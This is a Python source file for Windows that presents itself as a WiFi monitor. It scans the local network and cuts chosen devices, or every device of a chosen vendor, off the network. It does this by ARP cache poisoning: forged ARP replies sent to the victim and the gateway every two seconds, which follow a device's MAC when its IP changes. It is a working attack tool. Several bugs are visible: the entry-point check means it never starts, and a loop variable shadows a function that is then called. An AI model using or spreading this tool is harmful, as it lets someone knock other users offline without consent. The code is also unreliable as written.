
import os
import sys
import time
import socket
import ctypes
import threading
import subprocess
import ipaddress
import urllib.request
from collections import OrderedDict

from scapy.all import Ether, ARP, sendp, sniff, conf
from scapy.arch import get_if_list, get_if_addr, get_if_hwaddr

# ======================================================================
# ANSI colors (Windows 10+ terminals support them once VT mode is on)
# ======================================================================

def _enable_vt():
    if os.name == 'nt':
        try:
            kernel32 = ctypes.windll.kernel32
            h = kernel32.GetStdHandle(-11)          # STD_OUTPUT_HANDLE
            mode = ctypes.c_uint32()
            if kernel32.GetConsoleMode(h, ctypes.byref(mode)):
                kernel32.SetConsoleMode(h, mode.value | 0x0004)  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
        except Exception:
            pass

_enable_vt()

class C:
    RESET  = '\033[0m'
    BOLD   = '\033[1m'
    DIM    = '\033[2m'
    RED    = '\033[91m'
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    BLUE   = '\033[94m'
    MAGENTA= '\033[95m'
    CYAN   = '\033[96m'
    WHITE  = '\033[97m'
    GREY   = '\033[90m'

def ok(msg):    print(C.GREEN  + '[+] ' + msg + C.RESET)
def warn(msg):  print(C.YELLOW + '[!] ' + msg + C.RESET)
def err(msg):   print(C.RED    + '[x] ' + msg + C.RESET)
def info(msg):  print(C.CYAN   + '[*] ' + msg + C.RESET)

BANNER = C.MAGENTA + C.BOLD + r"""
   __      __      ___.      _____                     __
  /  \    /  \ ____\_ |__   /  _  \   ____   ____   __| _/ ______
  \   \/\/   // __ \ | __ \ /  /_\  \_/ __ \ /    \ / __ | /  ___/
   \        /\  ___/ | \_\ \/    |    \  ___/|   |  |/ /_/ | \___ \
    \__/\  /  \___  >|___  /\____|__  /\___  >___|  /\___ | /____  >
         \/       \/     \/         \/     \/     \/      \/      \/ """ + C.RESET

# ======================================================================
# Globals
# ======================================================================

IFACE        = ''
LOCAL_IP     = ''
LOCAL_MAC    = ''
GATEWAY_IP   = ''
GATEWAY_MAC  = ''
SSID         = ''
BSSID        = ''

DEVICES       = OrderedDict()   # ip  -> {'mac', 'seen', 'pkts'}
ACTIVE_BLOCKS = OrderedDict()   # mac -> {'ips': set, 'stop': Event, 'label'}
                                # keyed by MAC so blocks follow DHCP changes

FAKE_MAC = '02:00:00:00:00:01'
RESCAN_INTERVAL = 60

OUI = {
    '3c:22:fb': 'Apple',    'f0:18:98': 'Apple',    '10:5a:f0': 'Apple',
    '50:c7:bf': 'TP-Link',  'c8:3a:35': 'TP-Link',  'f4:f2:6d': 'TP-Link',
    '60:32:b1': 'TP-Link',  '64:64:4a': 'Xiaomi',   '78:11:dc': 'Xiaomi',
    '00:1f:3b': 'Intel',    'b8:27:eb': 'Raspberry Pi', 'dc:a6:32': 'Raspberry Pi',
}
OUI_DB = {}   # full IEEE database, filled by load_oui_db()
OUI_DB_URL    = 'https://standards-oui.ieee.org/oui/oui.txt'
OUI_DB_PATH   = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'oui.txt')

# ======================================================================
# Helpers
# ======================================================================

def run_cmd(args):
    try:
        p = subprocess.run(args, capture_output=True, text=True,
                           encoding='utf-8', errors='replace', timeout=10)
        return p.stdout or ''
    except Exception:
        return ''

def mac_norm(mac):
    return str(mac).strip().lower().replace('-', ':')

def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False

def get_ssid():
    global SSID, BSSID
    out = run_cmd(['netsh', 'wlan', 'show', 'interfaces'])
    for line in out.splitlines():
        low = line.strip()
        if ':' not in low:
            continue
        head, _, val = low.partition(':')
        head = head.lower()
        if head == 'ssid':
            SSID = val.strip()
        elif head == 'bssid':
            BSSID = mac_norm(val)
    if not SSID:
        out2 = run_cmd(['netsh', 'wlan', 'show', 'connections'])
        for line in out2.splitlines():
            if ':' in line and 'name' in line.lower():
                SSID = line.split(':', 1)[1].strip()
                break

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return ''

def get_gateway():
    out = run_cmd(['route', 'print'])
    for line in out.splitlines():
        parts = line.split()
        if parts and parts[0] == '0.0.0.0' and len(parts) >= 4:
            return parts[2]
    return ''

def arp_lookup(ip):
    out = run_cmd(['arp', '-a'])
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 2 and parts[0] == ip:
            return mac_norm(parts[1])
    return ''

def resolve_mac(ip):
    if ip == LOCAL_IP:
        return LOCAL_MAC
    found = {'mac': ''}
    def cb(p):
        if p.haslayer(ARP) and p[ARP].op == 2 and p[ARP].psrc == ip and not found['mac']:
            found['mac'] = mac_norm(p[ARP].hwsrc)
    try:
        sendp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, pdst=ip),
              iface=IFACE, verbose=False)
        sniff(iface=IFACE, prn=cb, timeout=2, store=False)
    except Exception:
        pass
    return found['mac'] or arp_lookup(ip)

def pick_interface():
    try:
        r = conf.route.route('8.8.8.8')
        if isinstance(r, tuple) and len(r) > 0 and r[0]:
            return str(r[0])
    except Exception:
        pass
    try:
        for iface in get_if_list():
            try:
                if get_if_addr(iface) == LOCAL_IP:
                    return iface
            except Exception:
                continue
    except Exception:
        pass
    try:
        lst = get_if_list()
        if lst:
            return lst[0]
    except Exception:
        pass
    return ''

def load_oui_db():
    """Load full IEEE OUI database (downloads once, caches to disk)."""
    if OUI_DB:
        return
    if not os.path.exists(OUI_DB_PATH):
        info('Downloading IEEE OUI database (one-time, ~2 MB) ...')
        try:
            urllib.request.urlretrieve(OUI_DB_URL, OUI_DB_PATH)
            ok('Saved to ' + OUI_DB_PATH)
        except Exception as e:
            warn('Could not download OUI database: ' + str(e))
            return
    try:
        with open(OUI_DB_PATH, 'r', encoding='utf-8', errors='replace') as f:
            for line in f:
                if '(hex)' in line:
                    prefix, _, rest = line.partition('(hex)')
                    prefix = (prefix.strip()
                              .replace('-', '').replace(':', '').lower())
                    vendor = rest.strip()
                    if vendor:
                        OUI_DB[prefix[:6]] = vendor
        ok('OUI database loaded: ' + str(len(OUI_DB)) + ' vendors')
    except Exception as e:
        warn('OUI load failed, falling back to built-in table.')

def oui_vendor(mac):
    mac = mac_norm(mac).replace(':', '')
    return OUI_DB.get(mac[:6], OUI.get(mac[:6], 'unknown'))

def check_root():
    if not is_admin():
        err('This tool must run as Administrator (ARP raw sends need it).')
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, 'runas', sys.executable, ' '.join(sys.argv), None, 1)
        except Exception:
            pass
        sys.exit(1)

# ======================================================================
# Setup / discovery
# ======================================================================

def setup():
    global LOCAL_IP, GATEWAY_IP, GATEWAY_MAC, LOCAL_MAC, IFACE, SSID, BSSID
    print()
    info(C.BOLD + 'Building network profile ...' + C.RESET)
    LOCAL_IP = get_local_ip()
    if not LOCAL_IP:
        err('Could not determine the local IP. Check the connection.')
        return False
    IFACE = pick_interface()
    if not IFACE:
        err('Could not pick a network interface.')
        return False
    GATEWAY_IP = get_gateway()
    if not GATEWAY_IP:
        err('Could not find the default gateway.')
        return False
    get_ssid()
    try:
        LOCAL_MAC = mac_norm(get_if_hwaddr(IFACE))
    except Exception:
        LOCAL_MAC = ''
    load_oui_db()
    print()
    print('   ' + C.CYAN  + 'SSID       ' + C.RESET + ': ' + (SSID or 'n/a'))
    print('   ' + C.CYAN  + 'BSSID      ' + C.RESET + ': ' + (BSSID or 'n/a'))
    print('   ' + C.CYAN  + 'Interface  ' + C.RESET + ': ' + IFACE)
    print('   ' + C.CYAN  + 'Local IP   ' + C.RESET + ': ' + LOCAL_IP)
    print('   ' + C.CYAN  + 'Local MAC  ' + C.RESET + ': ' + (LOCAL_MAC or 'unknown'))
    GATEWAY_MAC = resolve_mac(GATEWAY_IP)
    print('   ' + C.CYAN  + 'Gateway    ' + C.RESET + ': ' + GATEWAY_IP +
          '  (' + (GATEWAY_MAC or 'unknown') + ')')
    return True

def scan_now(burst=True, wait=6):
    global GATEWAY_MAC
    try:
        net = ipaddress.ip_network(LOCAL_IP + '/24', strict=False)
        hosts = [str(ip) for ip in net.hosts() if str(ip) != LOCAL_IP]
    except Exception:
        hosts = []
    collected = {}

    def cb(p):
        if p.haslayer(ARP) and p[ARP].op == 2:
            ip = p[ARP].psrc
            if ip:
                if ip in DEVICES:
                    DEVICES[ip]['pkts'] = DEVICES[ip].get('pkts', 0) + 1
                if ip not in collected:
                    collected[ip] = mac_norm(p[ARP].hwsrc)

    try:
        if burst and hosts:
            batch = [Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, pdst=ip)
                     for ip in hosts]
            sendp(batch, iface=IFACE, verbose=False)
        sniff(iface=IFACE, prn=cb, timeout=wait, store=False)
    except Exception as e:
        warn('Scan error: ' + str(e))

    new = 0
    for ip, mac in collected.items():
        if ip in DEVICES:
            DEVICES[ip]['mac'] = mac
            DEVICES[ip]['seen'] = time.time()
        else:
            DEVICES[ip] = {'mac': mac, 'seen': time.time(), 'pkts': 0}
            new += 1
    if LOCAL_IP and LOCAL_MAC:
        DEVICES[LOCAL_IP] = {'mac': LOCAL_MAC, 'seen': time.time(), 'pkts': 0}
    if GATEWAY_IP and GATEWAY_MAC:
        DEVICES[GATEWAY_IP] = {'mac': GATEWAY_MAC, 'seen': time.time(), 'pkts': 0}
    if GATEWAY_IP and not GATEWAY_MAC:
        GATEWAY_MAC = resolve_mac(GATEWAY_IP)

    # MAC-following blocks: if a blocked MAC shows up at a new IP, refresh
    for mac, blk in ACTIVE_BLOCKS.items():
        for ip, info in DEVICES.items():
            if info.get('mac') == mac and ip not in blk['ips']:
                blk['ips'].add(ip)
                info('Blocked device re-appeared at new IP: ' + ip)

    return len(collected), new

# ======================================================================
# Display
# ======================================================================

def status_str(ip, info, now):
    tags = []
    if ip == LOCAL_IP:
        tags.append(C.BLUE   + 'ME'      + C.RESET)
    if ip == GATEWAY_IP:
        tags.append(C.CYAN   + 'GW'      + C.RESET)
    if info.get('mac') in ACTIVE_BLOCKS:
        tags.append(C.RED    + 'BLOCKED' + C.RESET)
    if not tags:
        age = int(now - info.get('seen', now)) if info.get('seen') else 0
        tags.append(C.GREY   + str(age) + 's ago' + C.RESET)
    return ' | '.join(tags)

def print_devices():
    print()
    print('   ' + C.BOLD + ' #  IP Address      MAC Address        Vendor                 Status'
          + C.RESET)
    print('   ' + C.GREY + '-' * 72 + C.RESET)
    now = time.time()
    idx = 0
    for ip, d in DEVICES.items():
        idx += 1
        mac = d.get('mac', '')
        vend = oui_vendor(mac)
        print('   ' + C.WHITE + str(idx).rjust(2) + C.RESET + ' ' +
              ip.ljust(16) +
              (C.YELLOW if info.get('mac') in ACTIVE_BLOCKS else C.GREY) + mac.ljust(19) + C.RESET +
              vend.ljust(23) +
              status_str(ip, d, now))
    print('   ' + C.GREY + '-' * 72 + C.RESET)
    print('   Devices: ' + C.BOLD + str(len(DEVICES)) + C.RESET +
          '    Blocked: ' + C.BOLD + C.RED + str(len(ACTIVE_BLOCKS)) + C.RESET)

# ======================================================================
# Blocking engine  (keyed by MAC -> blocks survive DHCP address changes)
# ======================================================================

def send_poison(victim_ip, victim_mac, poison=True):
    """poison=True -> block, poison=False -> restore."""
    gw_mac = FAKE_MAC if poison else GATEWAY_MAC
    pkts = []
    if victim_ip and victim_mac:
        pkts.append(
            Ether(dst=victim_mac) /
            ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                psrc=GATEWAY_IP, hwsrc=gw_mac))
    if GATEWAY_MAC:
        pkts.append(
            Ether(dst=GATEWAY_MAC) /
            ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC,
                psrc=victim_ip, hwsrc=(FAKE_MAC if poison else victim_mac)))
    try:
        sendp(pkts, iface=IFACE, verbose=False)
    except Exception:
        pass

def block_device(ip=None, mac=None, quiet=False):
    """Block by IP or by MAC. Active poison is keyed on MAC."""
    if ip:
        d = DEVICES.get(ip)
        if not d or not d.get('mac'):
            if not quiet:
                warn('No MAC known for ' + ip + ' - run a scan first.')
            return False
        mac = d['mac']
    if not mac:
        return False
    if mac == GATEWAY_MAC or mac == LOCAL_MAC:
        if not quiet:
            warn('Refusing to block local host or gateway.')
        return False
    if ip and (ip == LOCAL_IP or ip == GATEWAY_IP):
        if not quiet:
            warn('Refusing to block local host or gateway.')
        return False
    if mac in ACTIVE_BLOCKS:
        if ip and ip not in ACTIVE_BLOCKS[mac]['ips']:
            ACTIVE_BLOCKS[mac]['ips'].add(ip)
        return True

    ips = {ip} if ip else set()
    stop = threading.Event()
    ACTIVE_BLOCKS[mac] = {'ips': ips, 'stop': stop, 'label': mac}

    def keeper():
        while not stop.wait(2):
            # re-poison every current + recently known IP for this MAC
            targets = set(ACTIVE_BLOCKS.get(mac, {}).get('ips', set()))
            for d_ip, d in DEVICES.items():
                if d.get('mac') == mac:
                    targets.add(d_ip)
            for t in targets - {LOCAL_IP, GATEWAY_IP}:
                send_poison(t, mac, poison=True)

    threading.Thread(target=keeper, daemon=True).start()
    if not quiet:
        name = ip or mac
        ok('Blocked ' + name + C.GREY + ' (' + mac + ')' + C.RESET)
    return True

def unblock_device(ip=None, mac=None):
    if ip:
        d = DEVICES.get(ip)
        mac = (d or {}).get('mac') or mac
    if not mac:
        info('Nothing to unblock.')
        return
    blk = ACTIVE_BLOCKS.pop(mac, None)
    if not blk:
        info((ip or mac) + ' is not blocked.')
        return
    blk['stop'].set()
    victim_ips = set(blk['ips'])
    for d_ip, d in DEVICES.items():
        if d.get('mac') == mac:
            victim_ips.add(d_ip)
    for _ in range(3):
        for v in victim_ips - {LOCAL_IP, GATEWAY_IP}:
            send_poison(v, mac, poison=False)
        time.sleep(0.3)
    for v in victim_ips - {LOCAL_IP, GATEWAY_IP}:
        try:
            sendp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, pdst=v),
                  iface=IFACE, verbose=False)
        except Exception:
            pass
    ok('Unblocked ' + (ip or mac) + C.GREY + ' (' + mac + ')' + C.RESET)

def cleanup_all():
    for mac in list(ACTIVE_BLOCKS.keys()):
        try:
            unblock_device(mac=mac)
        except Exception:
            pass
    info('Cleanup done - all targets restored.')

# ======================================================================
# Background rescan
# ======================================================================

RESCAN_THREAD = None

def auto_rescan_worker():
    while True:
        time.sleep(RESCAN_INTERVAL)
        try:
            global GATEWAY_MAC
            scan_now(burst=True, wait=4)
            if GATEWAY_IP and not GATEWAY_MAC:
                GATEWAY_MAC = resolve_mac(GATEWAY_IP)
        except Exception:
            pass

def start_auto_rescan():
    global RESCAN_THREAD
    if RESCAN_THREAD and RESCAN_THREAD.is_alive():
        return
    RESCAN_THREAD = threading.Thread(target=auto_rescan_worker, daemon=True)
    RESCAN_THREAD.start()
    info('Auto-rescan enabled (every ' + str(RESCAN_INTERVAL) + 's)')

# ======================================================================
# Vendor actions
# ======================================================================

def devices_by_vendor(name):
    needle = name.strip().lower()
    hits = []
    for ip, d in DEVICES.items():
        if ip in (LOCAL_IP, GATEWAY_IP):
            continue
        v = oui_vendor(d.get('mac', '')).lower()
        if v.startswith(needle) or needle in v:
            hits.append(ip)
    return hits

def block_by_vendor(should_block=True):
    print_devices()
    name = input('   Vendor name (e.g. Apple, Xiaomi, TP-Link): ' +
                 C.BOLD).strip() + C.RESET
    if not name:
        return
    targets = devices_by_vendor(name)
    if should_block:
        targets = [ip for ip in targets
                   if DEVICES[ip].get('mac') not in ACTIVE_BLOCKS]
    else:
        targets = [ip for ip in targets
                   if DEVICES[ip].get('mac') in ACTIVE_BLOCKS]
    if not targets:
        warn('No ' + ('blocked ' if not should_block else 'matching ') +
             'devices for vendor "' + name + '".')
        return
    info('Targets: ' + ', '.join(targets))
    for ip in targets:
        if should_block:
            block_device(ip=ip, quiet=True)
        else:
            unblock_device(ip=ip)
    if should_block:
        ok(str(len(targets)) + ' device(s) blocked (vendor: ' + name + ').')

# ======================================================================
# Interactive menu
# ======================================================================

def pick_target():
    print_devices()
    raw = input('   Enter # or IP (blank to cancel): ' + C.BOLD).strip() + C.RESET
    if not raw:
        return None
    if raw.isdigit():
        idx = int(raw) - 1
        ips = list(DEVICES.keys())
        if 0 <= idx < len(ips):
            return ips[idx]
        err('Invalid selection.')
        return None
    if raw in DEVICES:
        return raw
    err('Unknown IP (not in the device list).')
    return None

def show_status():
    print()
    print('   ' + C.CYAN + 'SSID    ' + C.RESET + ': ' + (SSID or 'n/a'))
    print('   ' + C.CYAN + 'Local   ' + C.RESET + ': ' + LOCAL_IP +
          '  (' + (LOCAL_MAC or '?') + ')')
    print('   ' + C.CYAN + 'Gateway ' + C.RESET + ': ' + GATEWAY_IP +
          '  (' + (GATEWAY_MAC or '?') + ')')
    print('   ' + C.CYAN + 'Devices ' + C.RESET + ': ' + str(len(DEVICES)))
    if ACTIVE_BLOCKS:
        print('   ' + C.CYAN + 'Blocked ' + C.RESET + ': ' +
              C.RED + ', '.join(ACTIVE_BLOCKS.keys()) + C.RESET)
    else:
        print('   ' + C.CYAN + 'Blocked ' + C.RESET + ': none')

MENU = """
   """ + C.BOLD + C.MAGENTA + '=========== WiFi Monitor ===========' + C.RESET + """
    1) Scan network
    2) List devices
    3) Block a device
    4) Unblock a device
    5) Unblock ALL devices
    6) Status
    7) Block by vendor
    8) Unblock by vendor
    0) Exit
   """ + C.BOLD + C.MAGENTA + '====================================' + C.RESET

def mainloop():
    print(BANNER)
    check_root()
    print('=== ' + C.BOLD + 'WiFi Monitor / Access Controller' + C.RESET + ' ===')
    if not setup():
        sys.exit(1)
    scan_now()
    start_auto_rescan()
    print_devices()
    while True:
        try:
            choice = input(MENU + '\n   > ' + C.BOLD).strip() + C.RESET
        except (KeyboardInterrupt, EOFError):
            choice = '0'
        if choice == '1':
            n, new = scan_now()
            ok('Scan finished: ' + str(n) + ' responded, ' +
               C.GREEN + str(new) + ' new' + C.RESET + '.')
            print_devices()
        elif choice == '2':
            print_devices()
        elif choice == '3':
            ip = pick_target()
            if ip:
                block_device(ip=ip)
        elif choice == '4':
            ip = pick_target()
            if ip:
                unblock_device(ip=ip)
        elif choice == '5':
            cleanup_all()
        elif choice == '6':
            show_status()
        elif choice == '7':
            block_by_vendor(should_block=True)
        elif choice == '8':
            block_by_vendor(should_block=False)
        elif choice == '0':
            cleanup_all()
            info('Bye.')
            break
        else:
            warn('Unknown option.')

if __name__ == '__mainloop__':
    mainloop()